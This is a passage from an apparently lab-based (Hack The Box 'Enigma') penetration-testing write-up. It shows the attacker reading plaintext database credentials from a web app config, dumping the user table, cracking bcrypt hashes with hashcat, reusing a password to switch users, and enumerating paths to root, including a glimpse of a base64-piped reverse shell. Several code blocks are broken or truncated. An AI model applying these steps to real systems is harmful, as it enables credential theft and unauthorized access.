    - **Purpose:** Reads the OpenSTAManager configuration file directly from disk — no special privileges required since `www-data` owns the web directory and can read its own application files.
- `/var/www/html/openstamanager/config.inc.php`
    - **Description:** The primary configuration file for the OpenSTAManager installation.
    - **Purpose:** Web applications store their database connection details here in plaintext — host, username, password, and database name — so the application can connect to MySQL on startup.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ cat /var/www/html/openstamanager/config.inc.php
<es$ cat /var/www/html/openstamanager/config.inc.php

The configuration file reveals the MySQL database credentials in plaintext:

```
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Two additional settings in the file are worth noting from a security perspective — `$disableCSRF = true` and `$redirectHTTPS = false`. These confirm the application is running with multiple security controls deliberately disabled, which contributed to making the earlier exploitation chain possible.

With valid database credentials in hand, the next step is to connect to MySQL and dump the application's user table. Web applications commonly store OS-level account credentials alongside application user records — and those hashes, if cracked, can be reused to log in as a real system user.

```shell
www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "show databases;" 2>/dev/null

#### Step 2 — List all tables inside the target database:

```shell

From the full table list, you'd scan for anything that looks user or credential related — names like `users`, `accounts`, `admin`, `members`, `auth` etc. In OpenSTAManager's case that turns out to be `zz_users`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### Step 3 — Dump the target table:

**Command:** `mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null`

**Breakdown:**

- `-u brollin`
    - **Description:** Specifies the MySQL username.
    - **Purpose:** Authenticates using the credential recovered from the configuration file.
- `-p'Fri3nds@9099'`
    - **Description:** Supplies the password inline without a space between `-p` and the value.
    - **Purpose:** Allows the command to run non-interactively inside the reverse shell without waiting for a password prompt — essential since we don't have a proper TTY.
- `-e "use openstamanager; select * from zz_users;"`
    - **Description:** Executes the given SQL statements and exits immediately.
    - **Purpose:** Selects the correct database and dumps the entire user table in a single non-interactive command, avoiding the need to enter the MySQL shell manually.
- `2>/dev/null`
    - **Description:** Redirects stderr to the null device, discarding all error output.
    - **Purpose:** Suppresses MySQL's inline-password security warning (`Warning: Using a password on the command line interface can be insecure`) which would otherwise clutter the output.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null

### 4.3 Cracking the Hashes

**Command:** `echo 'admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu' > hashes.txt ; echo 'haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' >> hashes.txt`

**Breakdown:**

- `> hashes.txt`
    - **Description:** Creates/overwrites `hashes.txt` with the first hash entry.
    - **Purpose:** Starts a clean file with the admin hash in `username:hash` format.
- `>>`
    - **Description:** Appends to an existing file without overwriting it.
    - **Purpose:** Adds the haris hash on a new line below the admin entry, giving hashcat a clean two-entry file to work against.
- `;`
    - **Description:** Runs both commands sequentially on one line regardless of whether the first succeeds.
    - **Purpose:** Keeps both file-writing operations in a single terminal entry without the line-joining issue caused by the backslash `\` continuation used in the previous attempt.

**Command:** `cat hashes.txt`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat hashes.txt
admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

The file is clean — two entries, one per line, each correctly prefixed with its username. Now run hashcat:

**Command:** `hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username`

**Breakdown:**

- `-m 3200`
    - **Description:** Selects hash mode 3200, corresponding to bcrypt (`$2*$` / Blowfish).
    - **Purpose:** Matches the exact hash format recovered from the `zz_users` table — identifiable by the `$2y$10$` prefix.
- `-a 0`
    - **Description:** Straight/dictionary attack mode.
    - **Purpose:** Tests every password in the wordlist against both hashes sequentially — the simplest and fastest approach before trying rules or masks.
- `hashes.txt`
    - **Description:** The file containing both hashes in `username:hash` format.
    - **Purpose:** Feeds both hashes to hashcat simultaneously so both are attempted in the same session rather than running two separate jobs.
- `/usr/share/wordlists/rockyou.txt`
    - **Description:** The RockYou leaked password wordlist containing 14 million real-world passwords.
    - **Purpose:** The most commonly used starting wordlist for credential attacks — covers the vast majority of weak and commonly chosen passwords.
- `--username`
    - **Description:** Tells hashcat to expect and ignore the `username:` prefix in the hash file.
    - **Purpose:** Without this flag hashcat would try to parse the username as part of the hash and throw a token length exception — as seen in the previous failed attempt.

**Result:** 

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

The status output shows `Recovered: 1/2 (50.00%)` — one of the two hashes cracked during the session. The line `INFO: Removed hash found as potfile entry` at the start also indicates hashcat already had one hash in its potfile (its cache of previously cracked hashes) from an earlier session, meaning `haris` had already been cracked before this run began. The `admin` hash did not crack within the wordlist — either the password is not in rockyou or it is strong enough to resist a straight dictionary attack.

The cracked result was confirmed with:

**Command:** `hashcat -m 3200 hashes.txt --show --username`

**Breakdown:**

- `--show`
    - **Description:** Displays all previously cracked hashes from the potfile instead of running a new attack.
    - **Purpose:** Quickly retrieves cracked results without re-running the full attack — useful for confirming results after a session completes or is interrupted.
- `--username`
    - **Description:** Includes the username prefix in the output.
    - **Purpose:** Maps the cracked plaintext back to the correct account so there is no ambiguity about which password belongs to which user.

**Result:**

```
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ hashcat -m 3200 hashes.txt --show --username                               
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

The `haris` hash cracked successfully to the plaintext password **`bestfriends`**. The `admin` hash produced no result — confirming the admin account uses a stronger password not present in the rockyou wordlist.

With a plaintext credential for `haris` in hand, the next step is to test whether this password is reused for the OS-level `haris` account on the system.

### 4.4 Lateral Movement to `haris` Confirmed

**Command:** `su haris`

**Breakdown:**

- `su`
    - **Description:** Switch User — allows switching to another user account from within the current shell session.
    - **Purpose:** Tests whether the bcrypt-cracked database password (`bestfriends`) is reused for the corresponding OS-level account — continuing the password reuse pattern established earlier in this engagement.
- `haris`
    - **Description:** The target username to switch to.
    - **Purpose:** `haris` was identified as the most likely OS-level account from the database dump based on its realistic username and non-admin group assignment.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ su haris
su haris
Password: bestfriends
id
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
```

The switch succeeded — confirming once again that credentials are being reused across different systems within this environment. The same password stored in the OpenSTAManager database is also the login password for the `haris` OS account.

The `id` output confirms we are now operating as a real system user:

- `uid=1000` — a standard non-root user account (root is always uid=0)
- `gid=1000(haris)` — primary group is haris
- `groups=1000(haris),100(users)` — also a member of the `users` group, which is a standard group for regular Linux desktop/workstation users

## 5. PrivEsc to Root

### 5.1 Check sudo permissions first

With a foothold as `haris`, work through the standard privilege escalation checklist, starting with the most straightforward checks first.

**Command:** `sudo -l`

**Breakdown:**

- `-l`
    - **Description:** Lists the commands the current user is permitted to run via sudo.
    - **Purpose:** The first and most direct privilege escalation check — if `haris` can run anything as sudo, the path to root could be trivial.

**Result:**

```shell
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

`sudo -l` requires a proper TTY to prompt for a password, which we don't have in this raw reverse shell. This doesn't necessarily mean `haris` has no sudo rights — only that we can't check right now without upgrading the shell. Moving on to the next check

### 5.2 Check SUID binaries

**Command:** `find / -perm -4000 -type f 2>/dev/null`

**Breakdown:**

- `-perm -4000`
    - **Description:** Matches files with the SUID bit set — files that run as their owner (usually root) regardless of who executes them.
    - **Purpose:** SUID binaries owned by root are a classic privilege escalation vector if any of them are known to be exploitable.
- `-type f`
    - **Description:** Restricts results to regular files only.
    - **Purpose:** Avoids matching directories or symlinks that also happen to have the SUID bit set.
- `2>/dev/null`
    - **Description:** Suppresses permission denied errors.
    - **Purpose:** Keeps the output clean since we can't read every directory on the system as `haris`.

**Result:**

```
find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/mount.nfs
```

Every binary in this list is a standard Ubuntu system binary — none are custom scripts, unusual third-party tools, or known exploitable versions. There is nothing here that provides a clear privilege escalation path. Moving on.

### 5.3 Check running processes

**Command:** `ps aux`

**Breakdown:**

- `a`
    - **Description:** Shows processes from all users, not just the current user.
    - **Purpose:** Gives a complete picture of everything running on the system, including processes owned by root that we might be able to interact with.
- `u`
    - **Description:** Displays output in user-oriented format, including the owning username, CPU, and memory usage.
    - **Purpose:** Makes it immediately visible which processes are running as root versus other users.
- `x`
    - **Description:** Includes processes not attached to a terminal.
    - **Purpose:** Captures background daemons and services — exactly the kind of processes most likely to offer a privilege escalation path.

**Result:**

```shell
ps aux

Scanning through the full process list, the vast majority are standard system daemons — `systemd`, `journald`, `rpcbind`, `dovecot`, `nginx`, `php-fpm`, `mysqld`, `postfix`. Our own reverse shell is also visible:

```shell
www-data  4318  sh -c -- echo YmFzaC...|base64 -d|bashwww-data  4321  bashwww-data  4322  bash -iharis     4911  bash
```

One process stands out immediately from everything else:

```shell
ps aux | grep -i olivetin
root        1520  0.0  0.3 1238992 15436 ?       Ssl  Jun30   0:00 /usr/local/bin/OliveTin
haris       5081  0.0  0.0   6544  2348 ?        S    11:37   0:00 grep -i olivetin
```

**OliveTin** — running as **root**, installed at a non-standard path (`/usr/local/bin/`), and not a default Ubuntu system service. This is exactly the kind of anomaly worth investigating: a third-party application running with full root privileges.

### 5.4 Check listening ports


**Command:** `ss -tlnp`

Now that `ps aux` has surfaced OliveTin as a process of interest, `ss -tlnp` is run as a natural follow-up to confirm which port it is bound to and whether it is reachable from our current shell.

**Breakdown:**

- `-t`
    - **Description:** Shows TCP sockets only.
    - **Purpose:** Filters out UDP noise to focus on services accepting connections.
- `-l`
    - **Description:** Shows only listening sockets.
    - **Purpose:** Surfaces active services waiting for connections rather than established sessions.
- `-n`
    - **Description:** Shows numeric addresses and port numbers without resolving names.
    - **Purpose:** Faster output and avoids misleading service-name substitutions.
- `-p`
    - **Description:** Shows the process owning each socket.
    - **Purpose:** Confirms which process is bound to which port — though note this only shows process details for sockets owned by the current user; root-owned sockets show no process name without elevated privileges.

**Result:**

```shell

```

**Key Findings:**

```shell
LISTEN  127.0.0.1:1337   — OliveTin (loopback only)LISTEN  127.0.0.1:3306   — MySQL (loopback only)LISTEN  127.0.0.1:33060  — MySQL X Protocol (loopback only)LISTEN  127.0.0.1:25     — Postfix SMTP (loopback only)
```

Port **1337** is bound exclusively to `127.0.0.1` — meaning it is only accessible from within the machine itself, which is exactly why it didn't appear in the original external Nmap scan. Since we have a shell on the machine as `haris`, we can reach it directly. Combined with the fact that OliveTin is running as root, this loopback-only service is the privilege escalation target.

![[Pasted image 20260701150317.png]]

The key takeaway: every loopback port (`127.0.0.1:*`) was invisible to Nmap because Nmap scanned from outside the machine. We can only see and reach them now because we're already inside as `haris`.

Port 1337 is the only loopback port with no universally-known standard service assigned to it — everything else (3306, 25, 53) has a decades-old standard. That gap, combined with OliveTin appearing in `ps aux` as a root process with a known default port of 1337, is how the connection is made.
